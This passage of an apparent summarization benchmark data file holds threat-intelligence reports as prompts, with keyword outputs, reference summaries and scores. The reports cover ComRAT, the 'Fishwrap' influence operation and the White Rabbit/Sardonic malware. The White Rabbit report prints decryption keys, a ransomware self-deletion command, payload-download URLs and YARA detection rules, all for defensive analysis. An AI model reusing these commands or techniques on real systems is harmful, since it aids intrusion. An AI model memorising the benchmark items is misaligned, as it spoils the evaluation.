definitely been removed. We assume this happened due to the fact that Microsoft has disabled AutoRun for external media. For the attackers, this infection vector is not interesting anymore. The malware is injected into every process of the infected machine and the main payload is executed in \u201cexplorer.exe\u201d as we explained in our article; The communication channel to the command and control is not the same anymore. In this new version, the malware uses POST requests with the following pattern:As the malware is injected into every process of the infected system, it creates named pipe in order to handle inter-processes communication.On several 3.00 samples, the author forgot to remove the compilation path, here are some examples:c:\\projects\\ChinckSkx64\\Debug\\Chinch.pdb c:\\projects\\ChinckSkx64\\Release\\libadcodec.pdb C:\\projects\\ChinckSkx64\\x64\\Release\\libadcodec.pdb E:\\old_comp\\_Chinch\\Chinch\\trunk\\Debug\\Chinch.pdb c:\\projects\\ChinchSk\\Release\\libadcodec.pdbThanks to these compilation paths, we assume that the original name of the RAT is \u201cChinch\u201d, which leads us to the assumption that the \u201cCH\u201d characters in the version name and in the flag \u201c<CHCMD>\u201d stands for \u201cChinch\u201d. In English, chinch is the word for a small North American bug, Blissus leucopterus. This word is Code similarity: 90%The codes are similar to each other, but the authors added several features:The malware generates more logs; The malware has a Mutex handle; The 3.10 version supports multiple command and control servers.The last new feature is really interesting: if the compromised targets block a specific command and control Code similarity: 93%The major new feature in the version is the new exports function called InstallW(). This exported function is used by the dropper to add persistence in the registry and to drop a second file (as explained in our previous article). Version 3.20 uses the following CLSID in order to hijack COM object: B196B286-BAB4- 101A-B69C-00AA00341D07. This object is the IConnectionPoint interface. The CLSID was only used in this version. We assume that the performed COM object hijacking generates some trouble on the infectedsystem, that\u2019s why the author changed related things in the next version. Furthermore, the CLSID was Code similarity: 91%In the 3.25 version, the author switched to the CLSID: 42aedc87-2188-41fd-b9a3-0c966feabec1 as described in our article. Furthermore, the strings in the sample are obfuscated. The main new feature is the obfuscation \u2013 almost all strings are obfuscated and the XML pattern is not written in plain text anymore.Differences between version Ch 3.25 (2014-02) and Ch 3.26 (2013-01; date has Code similarity: 95%The version 3.26 is the latest known version. In this version:The authors removed the familiar XOR key used by Agent.BTZ and Uroburos. We assume that due to the G DATA publication in February 2014, the author decided to remove as many links as possible between Uroburos and Agent.BTZ/ComRAT/Chinch; The authors do not generate logs anymore; The compilation date has been modified, in order to make the analysis and timeline creation more complex.ConclusionThis analysis shows us seven years of the evolution of a Remote Administration Tool, used by a group which targeted extremely sensitive entities, such as the US Pentagon in 2008 or the Belgium Ministry of Foreign Affairs in 2014 as well as the Finnish Ministry of Foreign Affairs.Except for version 3.00, the modifications made are rather marginal. We can see that the authors adaptedfeatures to the Windows versions, patched bugs, added obfuscation etc\u2026 The biggest update was performed to version 3.00, after two years of silence. Visibly, this RAT was used alongside the Uroburos rootkit. Nevertheless, it is not entirely clear how and when the attackers choose to use the RAT or the rootkit or whether both are used in parallel.Taking everything into consideration, G DATA SecurityLabs experts are sure that the group behind Uroburos/Agent.BTZ/ComRAT/Linux tool/\u2026 will remain an active player in the malware and APT field. The newest revelations made and connections drawn let us believe that there is even more to come. ", "generated_text": "the evolution; spyware; ComRAT; Agent.BTZ; the Uroburos rootkit; 2007; 2008; the history; ten major versions; XOR; the core architecture; a rootkit; the network; the development; detection; the malware; first; the IP address; a USB port; the IP.", "ref_text": "<START-1>The document analyzes the evolution of the sophisticated ComRAT malware, which is the successor to the Agent.BTZ remote access trojan (RAT). Both are linked to the Uroburos rootkit and used by the same threat actor in targeted campaigns. The analysis covers 7 years of development across 10 major versions of the RAT, from Agent.BTZ v1.0 in 2007 to ComRAT v3.26 in 2014. Version info shows incremental changes over time with the biggest update in v3.00 transitioning it from Agent.BTZ to ComRAT. Early versions of Agent.BTZ rely on AutoRun for infection and use a simple XOR cipher and ASCII config. Later versions add obfuscation, support for Windows Vista, bug fixes, and COM object hijacking.  ComRAT in v3.00 switches compilers, name, comms, injects all processes, and leverages pipes for IPC. It exfiltrates more system info and abandons AutoRun. Later versions add logging, multiple C2s, new registry persistence, and further string obfuscation. The RAT evolved to support new Windows versions, evade detection, fix bugs, and enhance capabilities over time. The timeline matches reported attacks on high-value targets like government bodies. The threat actor behind it continues to actively develop multiple malware strains to compromise targets. Their tools show an interest in persisting on systems long-term while exfiltrating sensitive data. The analysis provides valuable historical insight into the adversary's malware development lifecycle over many years.<END-1>", "t5/keyword/hint_hit_precision": 0.35, "t5/word/hint_hit_recall": 0.04524886877828054, "gpt3/lexical/rouge_rouge1": 0.3668639053254437, "gpt3/lexical/rouge_rouge2": 0.07738095238095238, "gpt3/lexical/rouge_rougeL": 0.1893491124260355, "gpt3/lexical/rouge_rougeLsum": 0.1893491124260355, "gpt3_generated_text": ["This article explores the evolution of sophisticated spyware, specifically focusing on the development of ComRAT from its predecessor Agent.BTZ. The connection to the Uroburos rootkit is highlighted, showcasing the actor behind these campaigns and their use of various malware strains. The analysis covers the years 2007 and 2008, with a decline in new versions in 2009 and a resurgence in 2012. The article delves into the core architecture, network capabilities, and detection methods of the malware, tracing its evolution through ten major versions. The history of ComRAT and its impact on cybersecurity is examined, emphasizing the need for vigilance in protecting against advanced spyware threats."]}, {"split_name": "val", "sample_id": "val_15", "prompt_text": "Extract the keywords: For several years, Recorded Future has been developing tools and methodologies for detecting and analyzing influence operations by nation-states and others. We have recently upgraded some of these tools and applied them to detecting a new kind of influence operation, which recycles old news about terror incidents by publishing them to appear as new. We refer to this technique as \u201cFishwrap.\u201d This operation is also using a special family of URL shorteners that allow attackers to track click-through from social media posts used in their campaigns.Key Findings\u2022 We have developed new algorithms for identifying influence operations. These algorithms allow for the detection of \u201cseed accounts,\u201d which can be used to analyze additional accounts engaged in an operation.\u2022 Behavioral analytics based on topological methodologies can be used to analyze the highest-likelihood participants in an operation and cluster those with the highest degree of similarity.\u2022 Using this methodology, we identified a new kind of influenceoperation: Fishwrap. This methodology uses old terror news masquerading as new.\u2022 Over 215 social media accounts participating in the Fishwrapoperation were analyzed.\u2022 These social media accounts use a special family of at least 10 different URL shortener services that allow for tracking the effectiveness of the operation. All of these URL services are running the same code and are hosted on the same commercial infrastructure.\u2022 The accounts\u2019 behavioral similarity leads us to believe thatthey are all part of the same influence operation.\u2022 Since account holders are most likely fictive and thedomains used for the URL shortener services are registered anonymously, attribution is difficult \u2014 however, research is ongoing.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 1Influence OperationsRAND Corporation defines information operations and warfare, also known as influence operations, as the collection of tactical information about an adversary, as well as the dissemination of propaganda in pursuit of a competitive advantage over an opponent.Recorded Future and its partners have been engaged in identifying and characterizing influence operations for more than five years, with studies including how terror supporters spread propaganda, election hacking in the U.S. in 2016 and 2018, and how China uses social media to influence U.S. opinion.Influence operations are, of course, not an exclusive nation-state activity \u2014 political groups use the same mechanisms, as do criminals engaging in stock manipulation activities.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 2The Anatomy of an Influence OperationInfluence operations that aim to change public opinion (for example, trying to sway the outcome of an election) need to reach a large number of people with messages that resonate with their beliefs or fears. Previously, certain groups, including the Nazis in the 1930s all the way to the Hutus in the 1990s, used radio to obtain massive reach. Today, social media has become the channel of choice for influence operations. Using data-driven profiling, messages can be personalized, as highlighted by the Cambridge Analytica scandal.Even though \u201cfake news\u201d has become highly associated with influence operations, in many cases, \u201creal news\u201d is also used, but it\u2019s carefully selected to emphasize the opinions the operation wishes to foment. These news pieces can be distributed in different ways, such as through paid advertising (as in the Cambridge Analytica case), by using a large number of social media accounts that are controlled by humans (so-called \u201ctrolls\u201d), or with algorithms. Advertising campaigns are hard to detect without access to users\u2019 news feeds, but campaigns using ordinary social media posts by a large number of accounts will be possible to detect by using a solution such as Recorded Future.Detecting and Tracking Influence OperationsTo detect an influence operation, we need a starting point \u2014 a seed. This can be a particular story that is used by the operation engaging in it. Once one or more seeds have been selected, we can broaden the scope of our investigation by finding related topics, such as URLs, hashtags, and user accounts. The image below illustrates how our Snowball algorithm can be used to grow the number of potential accounts engaged in an operation, starting with either a few accounts or with some topics believed to be used by an operation.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 3The Snowball algorithm generates a large number of candidate accounts, but will also typically find many false positives since \u201cinnocent\u201d accounts will repost news from the operation. To decide which accounts are really part of the operation, we can use behavioral analytics to characterize and cluster the activities implicated by the Snowball algorithm.Our approach to analytics is to define a number of similarity metrics over a large set of social media accounts. For example, accounts are more similar if they:\u2022 Post the same URLs and hashtags \u2014 the similarity is stronger if only a few accounts post a certain URL or hashtag within a certain time frame\u2022 Post on the same topics, as defined by the entities and eventsthey mention\u2022 Are using the same URL shorteners\u2022 Have similar temporal behavior \u2014 either their overall periodof activity or their weekly or daily behavioral patterns\u2022 Have mutually exclusive but adjacent overall periods ofactivity \u2014 this is a weak but not insignificant indication that one account has replaced the other\u2022 Have similar account names, as defined by the editingdistance between their namesRecorded Future | www.recordedfuture.com | CTA-2019-0612 | 4All of these different similarity metrics can be used to cluster accounts. We then look at sets of accounts which are associated with multiple identical similarity clusters. These accounts are highly likely to be part of the same influence operation. Accounts which are related only through joint membership in one cluster are not very likely to be part of the operation \u2014 they are just associated (for example, by having reposted a post originated by the operation).Fake News in Influence Operations: 2 ExamplesIdentifying fake or biased news can be hard, but by looking at some examples, we can gain some insight. For example, in a timeline view of reports on protests in Sweden in 2018, one event on July 16, 2018 regarding Muslims protesting against crosses stands out because it is only being reported in Russian. This is quite strange for what should be major news in Sweden, and different from all other major protests during the period.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 5Even though we first found this \u201cnews\u201d in Russian, it was also referenced by other social media accounts (like U.S. alt-right ones).This particular story turns out to be entirely fake, and in this case, we could actually use a reverse image search to find the original story, which turns out to be about students protesting in Chile two years earlier.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 6This example validates our intuition that important news stories which are reported either only in a single language, in a surprisingly small volume, or only on social media, are good initial candidates for being fake or hyperpartisan news used in an influence operation.As another example, we compared the actual source distribution of a real terror event that took place on November 13, 2015 in Paris (177 thousand references, mostly in mainstream media) with fake news about an event in Paris on March 23, 2019 (only 19 references, mostly on social media). The account similarity associated with being one of the few accounts posting on March 23, 2019 is much higher than that associated with being one of thousands of accounts posting on November 13, 2015.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 7Fishwrap: A New Influence OperationThe fake Paris terror event mentioned above is actually part of an influence operation that we have detected using our new algorithms. This operation is focused on posting old terror news stories as if they were new, probably with the goal of spreading general fear and uncertainty. We call this operation Fishwrap, since it uses old news for other purposes.We first detected Fishwrap through our automatic tracking of terror events only reported by social media, like the Paris example above. Below is another example of such event reporting.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 8By tracking terror events in Recorded Future that were only reported on social media, we were able to find a set of about a dozen accounts clearly engaged in spreading old terror news as if it were new. The reason we compared the specific dates in the Paris terror example above is because of a social media post from March 23, 2019 reporting on an event shown in the image below.However, the URL-shortened link in the post led us to an article about the original event from November 13, 2015. While many readers would probably not scrutinize the publication dates, it is easy to see how the post could cause concern for those reading it and prompt them to follow the link to validate the news, missing the difference in publication date.By applying the Snowball algorithm to the small set of identified posts, we could swiftly grow the number of suspicious activities in this operation to more than a thousand profiles.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 9Narrowing It DownWe then looked at the similarities within this fairly large set of accounts and concentrated on three specific aspects:1. Temporal behavior2. The domain of the URLs referred to in the accounts\u2019 posts3. Account statusTemporal BehaviorBy plotting the activity (postings) of all accounts found in the operation, we can identify different activity periods.We clearly see three different clusters of accounts:1. Those active between May 2018 to October 20182. Those active between November 2018 to April 20193. Those active during the entire time period, between May 2018to April 2019Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 10These temporal patterns indicate the launch of a number of accounts in May 2018, many of which were shut down in October 2018. These were followed a few weeks later by a new batch of accounts with the same behavior and still in operation.Topic Similarity: URLs and Domains UsedBy looking at the URLs posted by a subset of the accounts, it is clear that there is some relationship between them since they, to some extent, post identical URLs.The graph above looks quite complicated. However, if we focus only on the domains of these URLs, a much simpler picture emerges, shown below.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 11It turns out that a lot of the accounts are posting all of their links through a small number of URL shortener services (in the example above, pucellina[.]com and bioecologyz[.]com). More precisely, we can identify 10 domains hosting URL shortener services that are used for essentially every single post made by 215 of the identified accounts. As seen in the graph above, some accounts use multiple URL shorteners, and thus show that there is an indirect connection between accounts using different shorteners. Overall, we can see that each domain has a fairly large number of accounts that has published some reference to it, and a very small number of accounts have published a reference to more than one of the domains (based on the data we\u2019ve collected). The exception is the two domains pucellina[.]com and bioecologyz[.]com, where a larger number of accounts have published references to both domains.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 12It gets more interesting! Upon inspecting the 10 different URL shortener websites, we immediately see that their appearance is identical.This is strong evidence linking all 215 accounts to 10 URL shorteners, which in turn appear to be running the same code. Interestingly, an inspection of the HTML code for the URL shorteners also reveals that these domains seem to be tracking all agents that follow the links. This could be to measure the effectiveness of the operation, but it might also be used for profiling the \u201ccaptured audience\u201d of the operation.Unfortunately, all of these 10 domains are anonymously registered, and we cannot see who registered or owns them. We did investigate where these services are hosted, and it turns out they are all f89.meadminsky.cn xincache.com 22.cn22.cn24,156 11,232We can clearly see two clusters of domains corresponding to the two time frames we identified in the temporal analysis above. The first eight domains were created just prior to the observed start of the campaign (the red accounts in the temporal analysis above), and the last two domains were created some weeks before the launch of the second wave of the campaign (the orange accounts in the temporal analysis above).We can also see historic name servers for a couple of domains, but this does not give us much additional information. None of the 10 domains have any risk score in Recorded Future \u2014 the only trace of malicious activity is that one of the previous name servers has been associated with a suspicious IP number and a malware command and control server.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 14Sadly, due to anonymous registration, this is where our trail ends! We can only speculate as to who registered these domains and is running the network of social media accounts that use them. The fact that the operation has been going on for close to a year, and that it is spending money on numerous domains on dedicated servers, leads us to believe this is not just someone running the operation \u201cfor the lulz,\u201d but rather, a political organization or nation-state with an intent to spread fear and uncertainty and track followers of the posted links.Account StatusUpon closer inspection of the status of the accounts, we note that a fair percentage of them have been suspended. The degree of suspension varies between different URL shortener service clusters, but it is clear that there has been no general suspension of accounts related to these URL shorteners. We believe one reason for this is that by posting links related to old, but real, terror events, the accounts are not in clear violation of any terms of service, and therefore have not been suspended due to either automatic identification or manual reporting.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 15ConclusionBased on a long track record of investigating influence operations, we developed a set of algorithms for identifying and analyzing such operations. Using these algorithms, we have identified a fairly large influence operation that uses old terror events repackaged as breaking news to gain attention. Using behavioral analytics, we have shown how more than 215 accounts have participated in or are participating in this operation. The operation uses a set of dedicated URL shortener services to link to old news, and this mechanism allows the operation to track the efficiency of its operation and possibly to analyze what kind of audience (at least geographically) it succeeds in targeting.About Recorded FutureRecorded Future arms security teams with the only complete threat intelligence solution powered by patented machine learning to lower risk. Our technology automatically collects and analyzes information from an unrivaled breadth of sources and provides invaluable context in real time and packaged for human analysis or integration with security technologies.Recorded Future | www.recordedfuture.com | CTA-2019-0612 | 16 ", "generated_text": "Recorded Future; a new type; influence operations; Fishwrap; old terror news; new; 215 social media accounts; a special family; URL shortener services; the operation; the accounts; similarities; attribution; a seed; an operation; the operations; topics; URLs; hashtags; user accounts; the code; domains; the URL shortener services; the same code; the same infrastructure; the operation; the domains; anonymity; attribution; the largest-likelihood participants; the same influence operation; campaigns; tactics; information operations; a competitive advantage; a campaign.", "ref_text": "<START-1>The cybersecurity firm Recorded Future has developed new algorithms to identify and analyze influence operations on social media. Using these methods, they discovered a coordinated influence campaign called \"Fishwrap\" that spreads old terror news stories as if they were new, likely to provoke fear and uncertainty. Recorded Future identified over 200 social media accounts participating in Fishwrap. The accounts exhibit similarities in timing of activity, topics posted, use of specific URL shortening services, and account suspension rates. This leads Recorded Future to believe the accounts are part of the same influence operation. The influence operation uses a network of 10 URL shortening services that appear identical in design and are hosted on the same infrastructure. The URLs allow the operators to track those who click through, possibly to analyze the effectiveness and target audience. The domains are anonymously registered, making attribution difficult. Given the significant time and infrastructure investment, Recorded Future speculates this is an influence operation by a political entity or nation-state rather than individuals. The goal seems to be spreading fear by repackaging old terror stories as new news. While not outright fake news, the stories are presented deceptively via the network of social media accounts. <END-1>", "t5/keyword/hint_hit_precision": 0.3333333333333333, "t5/word/hint_hit_recall": 0.11616161616161616, "gpt3/lexical/rouge_rouge1": 0.5, "gpt3/lexical/rouge_rouge2": 0.15976331360946747, "gpt3/lexical/rouge_rougeL": 0.2705882352941177, "gpt3/lexical/rouge_rougeLsum": 0.2705882352941177, "gpt3_generated_text": ["Recorded Future has developed new algorithms to identify influence operations, leading to the detection of a new type called Fishwrap, which involves recycling old terror news as new. Over 215 social media accounts were analyzed in this operation, utilizing a special family of URL shortener services for tracking. The accounts exhibit behavioral similarities, suggesting they are part of the same operation. Attribution is challenging due to fictive account holders and anonymously registered domains. Influence operations aim to change public opinion through reaching a large audience with personalized messages, often utilizing social media. By starting with a seed and expanding to related topics, such as URLs and user accounts, influence operations can be detected and tracked using methodologies like Recorded Future's Snowball algorithm. These operations can involve tactics such as propaganda dissemination and manipulation for a competitive advantage in various campaigns."]}, {"split_name": "val", "sample_id": "val_16", "prompt_text": "Extract the keywords: White Rabbit Continued: Sardonic and F5White Rabbit Continued:Sardonic and F5WHITE RABBIT CONTINUED: SARDONIC AND F5 In December 2021, Lodestone published an article linking a previously unknown ransomware group, White Rabbit, to the threat actor group FIN8 after observing striking similarities between the two during an investigation. The subsequent efforts by the cybersecurity community have brought together experts from around the world to \u201cfollow the White Rabbit,\u201d so to speak, and gain more insight into an emerging threat.Since the time the last article was published, Lodestone has observed evidence that a new version of FIN8\u2019s BadHatch backdoor malware, Sardonic, has been deployed and seen in use by White Rabbit. Lodestone experts have identified strong overlap between Sardonic and this new backdoor malware, dubbed F5 and encountered as part of the investigation that initially resulted in the discovery of the White Rabbit group.SARDONIC VS F5Overall, the functionality of the Sardonic .NET assembly (\u201cMDAC.dll\u201d) and the F5 assembly (\u201cDefault.dll\u201d) have strong similarities. They both contain Rivest Cipher 4 (RC4) encrypted shellcode, with the decryption key contained in the DLL, and both are compressed using Gzip. In the samples recovered by Lodestone, the decryption key for the \u201cMDAC.dll\u201d shellcode was 802d8B9Fe13f576163DEab429754cA0C, while the key for \u201cDefault.dll\u201d was 15e280Ea9d63270Fb89763514cDCABf4. As reflected in the screen snippets below, the decryption algorithms remained essentially unchanged.2White Rabbit Continued:Sardonic and F5Although the F5 and Sardonic backdoors appear to function nearly identically to each other, some features of the PowerShell script and the .NET DLL mentioned in the Bitdefender paper appear to have been removed; the PowerShell script no longer has an option to kill an existing process, and the \u201c4BMARC2WKL\u201d marker prepending the shellcode in \u201cMDAC.dll\u201d does not exist in \u201cDefault.dll\u201d. Since these were minor features of the malware, Lodestone could not determine why they may have been explicitly removed by the author.3White Rabbit Continued:Sardonic and F5Another observation Lodestone made during the investigation was a change in the method name executed by the PowerShell script. In Sardonic, the method used was \u201cMSDAC.PerfOSChecker::StartCheck\u201d; however, in F5, the name was changed to \u201co5518470.kfC09272::p65E1a71\u201d. Surprisingly, Lodestone did observe evidence of threat actors creating a new Windows Management Instrumentation (WMI) consumer for the F5 PowerShell script. It is possible that efforts to configure F5 to establish this persistence were abandoned once a decision was made deploy ransomware.4White Rabbit Continued:Sardonic and F5Lodestone encountered some difficulties in the analysis of \u201cDefault.dll\u201d which hampered progress. What Lodestone has determined thus far, however, is that, like the shellcode in \u201cMDAC.dll\u201d, the \u201cDefault.dll\u201d shellcode first checks the name of its parent process. If the parent process is \u201cpowershell.exe\u201d, the shellcode will open \u201clsass.exe\u201d with SeDebugPrivilege and copies its system token. Then, it creates a child process, \u201cWmiPrvSE.exe\u201d, with system privileges to enable it to inject its own code and run with elevated privileges. The malware then generates a 32-byte hardware ID based on the computer name and C volume serial number. The system time and hardware ID are then encrypted with a custom algorithm and placed into a 64-byte buffer before an attempt is made to connect to the C2 server. If the malware is unable to reach the C2 server after five attempts, it will terminate itself.EVIDENCE OF A HUMAN OPERATORInterestingly, Lodestone may have found evidence supporting Bitdefender\u2019s belief that the Sardonic or F5 loader is copied to the victim\u2019s machine via a manual process instead of automation. The logs Lodestone analyzed during the course of its investigation show that the filename of the URL hosting the malware was always a random, 6-character alphanumeric string that changed nearly every time the command was run. In one of the events, however, Lodestone noticed that the filename contained seven characters. The PowerShell log in the image below shows a command to download a file from hxxps://104-168-201-26.sslip[.]io/36d851e. Roughly one minute later, another command was run to download a file from hxxps://104-168-201-26.sslip[.]io/6d851e. Lodestone belives that the best explanation for this is that a human operator entered the incorrect URL and then reran the same command with the correct URL.5White Rabbit Continued:Sardonic and F56White Rabbit Continued:Sardonic and F5WHITE RABBITWhen Lodestone first acquired a sample of the ransomware, its experts observed that it was highly obfuscated, had strange file extensions (.physiat and .uderro), and used an invalid digital certificate. Additionally, Lodestone determined that the malware checked the command line arguments using \u201c-f\u201d, \u201c-l\u201d, \u201c-p\u201d, and \u201c-t\u201d flags.Lodestone\u2019s theory that the \u201c-p\u201d flag was for the password used to decrypt the payload was confirmed by a Trend Micro article on White Rabbit, as Lodestone\u2019s sample used the same passphrase as the sample analyzed by Trend Micro. The other flags allow an operator to specify which files (-f) to encrypt, an output (-l) for a log file, and a start time (-t) to begin encryption (if no time is specified the ransomware executes immediately). Once the malware completes its encryption function it executes a self- deletion function using the command:cmd /c choice /t 9 /d y & attrib -h \\\u201d[fname]\\\u201d & del \\\u201d[fname]\\\u201d7White Rabbit Continued:Sardonic and F5Lodestone continues to monitor the situation for any further developments and would like to thank its partners at Group-IB for their contributions to this investigation. To learn more about Group-IB, visit the following link: url group-ib.com/.8White Rabbit Continued:Sardonic and F5INDICATORS OF COMPROMISE IP Addresses64.44.131[.]3491.90.194[.]30104.168.132[.]128170.130.55[.]120Domains91-90-194-30.sslip[.]io104-168.132[.]128.nip[.]ioURLsurl description = \u201cPowershell .NET DLL Loader\u201d /* if([IntPtr]::size -eq 4){ */ $s0 = { 3D 69 66 28 5B 49 6E 74 50 74 72 5D 3A 3A 73 69 7A 65 20 2D 65 71 20 34 29 7B } /* [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String( */ $s1 = { 5B 53 79 73 74 65 6D 2E 52 65 66 6C 65 63 74 69 6F 6E 2E 41 73 73 65 6D 62 6C 79 5D 3A 3A 4C 6F 61 64 28 5B 53 79 73 74 65 6D 2E 43 6F 6E 76 65 72 74 5D 3A 3A 46 72 6F 6D 42 61 73 65 36 34 53 74 72 69 6E 67 28 } all of them description = \u201cSardonic Shellcode Loader\u201d Default.dll (x86) */ Default.dll (x64) */ $pdb1 = \u201cC:\\\\Users\\\\dev_win10_00\\\\Documents\\\\f5\\\\F5Utility\\\\ LoaderAssembly\\\\obj\\\\ \u201c nocase ascii $s0 = \u201cDefault.dll\u201d fullword wide $s1 = \u201c12F9333185494642C1587A546D2287C1A4C01A2A\u201d fullword ascii $s2 = \u201c05F6DF120FF54415A6B75A4B1894A83C6D865030\u201d fullword ascii $s3 = \u201c78893E31FF10BDE2CBCB8A51664788D7DC0FC194\u201d fullword ascii $s4 = \u201c15e280Ea9d63270Fb89763514cDCABf4\u201d fullword ascii 2 of them description = \u201cSardonic Shellcode(in the memory)\u201d strings: $h_x86 = { E8 00 00 00 00 5F B9 [2] 00 00 [2] 30 ?? 0F 17 00 00 00 02 ?? 0F 17 00 00 00 E2 F0 } /* *a1 = ((*a1 ^ (*a1 << 6)) >> 13) ^ (*a1 << 18) & 0xFFF80000; *a2 = (4 * *a2) & 0xFFFFFFE0 ^ (((4 * *a2) ^ *a2) >> 27); *a3 = ((*a3 ^ (*a3 << 13)) >> 21) ^ (*a3 << 7) & 0xFFFFF800; v4 = (*a4 << 13) & 0xFFF00000 ^ ((*a4 ^ (8 * *a4)) >> 12); */ $chunk_x86 = { 89 3A 8B 03 8D 3C 85 ?? ?? ?? ?? 31 F8 83 E7 E011White Rabbit Continued:Sardonic and F5C1 E8 1B 31 F8 89 03 8B 39 89 F8 C1 E0 0D 31 F8 C1 E7 07 C1 E8 15 81 E7 00 F8 FF FF 31 C7 89 39 8B 3E 8D 04 FD ?? ?? ?? ?? 31 F8 C1 E7 0D 81 E7 00 00 F0 FF C1 E8 0C 31 F8 } $h_x64 = { 41 [2] 48 C7 C1 [2] 00 00 4C 8D [2] 00 00 00 45 30 } /* *a1 = (*a1 << 18) & 0xFFF80000 ^ ((*a1 ^ (*a1 << 6)) >> 13); *a2 = (4 * *a2) & 0xFFFFFFE0 ^ (((4 * *a2) ^ *a2) >> 27); *a3 = (*a3 << 7) & 0xFFFFF800 ^ ((*a3 ^ (*a3 << 13)) >> 21); v4 = (*a4 << 13) & 0xFFF00000 ^ ((*a4 ^ (8 * *a4)) >> 12); */ $chunk_x64 = { 89 01 8B 02 44 8D 14 85 ?? ?? ?? ?? 44 31 D0 41 83 E2 E0 C1 E8 1B 44 31 D0 89 02 45 8B 10 44 89 D0 C1 E0 0D 44 31 D0 41 C1 E2 07 41 81 E2 00 F8 FF FF C1 E8 15 44 31 D0 41 89 00 45 8B 11 42 8D 04 D5 ?? ?? ?? ?? 44 31 D0 41 C1 E2 0D C1 E8 0C 41 81 E2 00 00 F0 FF 44 31 D0 } any of them }12White Rabbit Continued:Sardonic and F5ADDITIONAL INFORMATION RESOURCESMichael Gillespie\u2019s White Rabbit announcement on Twitter:url on FIN8:url forensic-investigation url Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdfTrend Micro on White Rabbit:url spotted-white-rabbit-and-its-evasion-tactics.htmlMITRE profile on FIN8url and PUNCHTRACKurl url Security is a wholly owned subsidiary of Beazley plc. Lodestone provides computer security and cybersecurity consulting services. Lodestone does not provide insurance services and client information obtained by Lodestone is not shared with Beazley claims or underwriting. Likewise, client information obtained by Beazley claims or underwriting is not shared with Lodestone.13www.lodestone.com 320 E. Main Street Lewisville, TX 75057 ", "generated_text": "the ransomware group; White Rabbit; FIN8; Sardonic backdoor malware; use; F5; the malware; similarities; PowerShell script; the PowerShell script; the shellcode; RC4 encryption; the decryption key; the DLL; Gzip; the decryption algorithm; the PowerShell script; the PowerShell script; an existing process; the PowerShell script; system privileges; the PowerShell script; a new Windows Management Instrumentation consumer; the malware; persistence; the victim; the victim; the threat actor; the White Rabbit group.", "ref_text": "<START-1>Here is a summary of the key points from the report on the Sardonic and F5 malware used by the White Rabbit ransomware group: - White Rabbit is a ransomware group linked to the cybercrime group FIN8 in previous research. - Lodestone security researchers analyzed a new FIN8 backdoor called F5 that shows strong similarities to an earlier backdoor called Sardonic. - Both Sardonic and F5 use RC4 encryption for shellcode, gzip compression, and minor differences in decryption routines. F5 removed some features like process killing. - The PowerShell loader script downloads the backdoor DLL from a server using random URLs, likely indicating manual control by a human operator. - F5 checks for \"powershell.exe\" as the parent process, copies the LSASS access token, and connects to a C2 server after encrypting the system ID. - The White Rabbit ransomware itself is highly obfuscated, uses invalid certificates, and command line arguments to specify encryption parameters. It deletes itself after encrypting files. - Technical details, IP addresses, domains, filenames, YARA rules, and other IOCs are provided for detection of the malware and its C2 infrastructure. - The report examines the evolution of FIN8's malware arsenal from Sardonic to F5 based on code reuse and shared tactics, reinforcing the link between FIN8 and White Rabbit. <END-1>", "t5/keyword/hint_hit_precision": 0.27586206896551724, "t5/word/hint_hit_recall": 0.05188679245283019, "gpt3/lexical/rouge_rouge1": 0.4573170731707317, "gpt3/lexical/rouge_rouge2": 0.14110429447852763, "gpt3/lexical/rouge_rougeL": 0.2621951219512195, "gpt3/lexical/rouge_rougeLsum": 0.2621951219512195, "gpt3_generated_text": ["This article discusses the connection between the ransomware group White Rabbit and the threat actor group FIN8, specifically focusing on the deployment of the Sardonic backdoor malware and its subsequent use by White Rabbit as the F5 backdoor. The similarities between Sardonic and F5, such as the RC4 encrypted shellcode and Gzip compression, are highlighted. Changes in the PowerShell script used by the malware, including the method name and the removal of certain features, are also examined. Additionally, evidence suggesting manual deployment of the malware to victims' machines and the creation of a new Windows Management Instrumentation consumer are discussed. The article sheds light on the evolving tactics of threat actors within the White Rabbit group and provides insights into their operations."]}, {"split_name": "val", "sample_id": "val_17", "prompt_text": "Extract the keywords: 5/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in Central Asia - Avast Threat LabsAPT Group Planted Backdoors Targeting High Pro\ufb01le Networks in Central Asiadecoded.avast.io/luigicamastra/apt-group-planted-backdoors-targeting-high-pro\ufb01le-networks-in-central-asiaMay 14, 2020Last fall, APT malware intrusions targeting high-pro\ufb01le companies in Central Asia caught our attention. A few months later, we began working together with fellow malware analysts from ESET to analyze samples used by the group to spy on a telecommunications company, a gas company, and a governmental institution in Central Asia. An APT group, which we believe could possibly be from China, planted backdoors to gain long-term access to corporate networks. Based on our analysis, we suspect the group was also behind attacks active in Mongolia, Russia, and Belarus.The group behind the attack frequently recompiled their custom tools to avoid AV detection, which, in addition to the backdoors, included Mimikatz and Gh0st RAT. This has led to a large number of samples, with binaries often protected by VMProtect, making analysis more dif\ufb01cult.The backdoors gave the actors the ability to manipulate and delete \ufb01les, take screenshots, manipulate processes, and services, as well as execute console commands, remove itself, and more. Further, some commands may have instructed the backdoors to ex\ufb01ltrate data to a C&C server. Infected devices could also be commanded by a C&C server to act as a proxy or listen on a speci\ufb01c port on every network interface. The group also used tools such as Gh0st RAT and Management Instrumentation to move laterally within in\ufb01ltrated networks.url\ufb01le-networks-in-central-asia/1/95/15/2020APT Group Planted Backdoors Targeting High Pro\ufb01le Networks in Central Asia - Avast Threat LabsTimelineFigure 1: Timeline of events related to the tracking of Microcin, and Avast notifying the targeted companyAvast\u2019s and Eset\u2019s antivirus engines blocked the samples used by the APT group prior to it attracting our attention, as our antivirus engines\u2019 detections are automated. Attribution & Clusterization The samples we analyzed contain links to malware samples and campaigns, such as Microcin, BYEBY, and Vicious Panda, previously described by Kaspersky, Palo 